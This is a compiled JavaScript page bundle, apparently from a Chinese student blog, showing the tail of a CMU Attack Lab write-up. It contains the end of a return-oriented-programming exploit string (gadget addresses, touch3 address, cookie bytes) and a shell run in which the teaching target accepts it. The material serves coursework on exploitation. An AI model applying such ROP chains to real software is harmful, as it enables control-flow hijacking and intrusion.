number"}},[t._v("40")]),t._v(" 00 00 00 00 00\t/*\tgadget6\t\t\t*/\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("69")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("18")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("40")]),t._v(" 00 00 00 00 00\t/*\tgadget7\t\t\t*/\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("49")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("18")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("40")]),t._v(" 00 00 00 00 00\t/*\tgadget8\t\t\t*/\na0 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("17")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("40")]),t._v(" 00 00 00 00 00 /*\ttouch3地址   \t   */\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("36")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("33")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("31")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("34")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("39")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("33")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("38")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("30")]),t._v(" /* \tcookie字符串\t  */\n00\n")])])]),a("p",[t._v("转换文件运行")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2017211523")]),t._v("@bupt3:~/target117$ ./hex2raw "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v(" phase5 "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./rtarget\nCookie: 0x63149380\nType string:Touch3"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!")]),t._v(": You called touch3"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"63149380"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nValid solution "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" level "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3")]),t._v(" with target rtarget\nPASS: Sent exploit string to server to be validated.\nNICE "),a("span",{pre:!0,attrs:{class:"token environment constant"}},[t._v("JOB")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!")]),t._v("\n")])])]),a("h1",{attrs:{id:"到此为止"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#到此为止"}},[t._v("#")]),t._v(" 到此为止")])])}),[],!1,null,null,null);s.default=n.exports}}]);